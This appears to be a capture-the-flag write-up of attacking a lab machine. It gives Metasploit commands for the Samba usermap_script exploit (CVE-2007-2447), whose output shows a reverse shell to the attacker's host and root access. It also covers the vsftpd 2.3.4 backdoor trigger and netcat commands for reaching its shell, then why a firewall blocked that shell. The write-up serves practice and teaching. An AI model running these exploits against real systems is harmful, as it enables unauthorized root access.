# Attack Path

Fist let’s scant he network:

```

We notice the service vsftpd 2.3.4 used, and there is a famous exploit on metasploit for this version. Let’s search it up in metasploit:

```bash
msfconsole
search vsftpd_234_backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
info

```

It seems we can add a backdoor and send commands using this exploit. Let’s input the RHOSTS and RPORT:

```bash
set RHOSTS 10.10.10.3
run
```

But the exploit does not seem to work.

The samba version is 3.0.20 and it has a known CVE: [**CVE-2007-2447**](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)

Let’s try and exploit this:

```bash
use exploit/multi/samba/usermap_script
set LHOST 10.10.16.59
set RHOST 10.10.10.3
run

result:
[*] Started reverse TCP handler on 10.10.16.59:4444 
[*] Command shell session 1 opened (10.10.16.59:4444 -> 10.10.10.3:34474) at 2025-04-13 19:48:47 +0100

whoami
root

```

Now that we are root, we can see why our ftp backdoor exploit did not work. First let’s check the listening ports on the device:

```bash
netstat -lntp

#we hava a bunch of open ports
```

Let’s see what happens when we trigger the ftp exploit;

The VSFTPd 2.3.4 backdoor is a malicious feature intentionally added to the source code of the VSFTPd (Very Secure FTP Daemon) version 2.3.4, a popular FTP server software. Here's a clear explanation:

### What Happened?

- **When**: Between June 30 and July 1, 2011, an unknown attacker compromised the official VSFTPd download server and uploaded a modified version of the vsftpd-2.3.4.tar.gz archive.
- **What**: The modified code contained a backdoor, which was not part of the legitimate software. This backdoor allowed unauthorized access to systems running the compromised version.
- **Discovery and Fix**: The backdoor was identified and removed by July 3, 2011, and the VSFTPd site was later moved to a more secure platform (Google App Engine) to prevent further tampering.

### How the Backdoor Works

- **Trigger**: The backdoor is activated when a user connects to the FTP server (port 21) and enters a username containing the string ":)" (a smiley face). For example, a username like "test:)" would work.
- **Effect**: Upon receiving this specific input, the server executes a function called vsf_sysutil_extra(), which opens a shell on port 6200 of the target system.
- **Access**: An attacker can then connect to port 6200 using a tool like telnet or netcat (e.g., nc <target_ip> 6200) and gain a command shell with root privileges, as VSFTPd often runs as root.

```bash
#On another terminal
nc 10.10.10.3 21
USER test:)

#now back on the pwned root
netstat -lntp

result:
tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      7375/vsftpd
```

We can see the port is now opened, therefore, there must be a firewall dropping our packets. Let’s check the firewall:

```bash
iptables -L
```

These iptables rules allow FTP traffic on port 21 (necessary for VSFTPd to function) but block all other incoming traffic by default, including port 6200, which the VSFTPd 2.3.4 backdoor uses. By dropping connections to port 6200, the firewall prevents attackers from accessing the backdoor’s shell, effectively neutralizing the exploit. The rules are solid, but tightening FTP access or adding logging could make them even better.
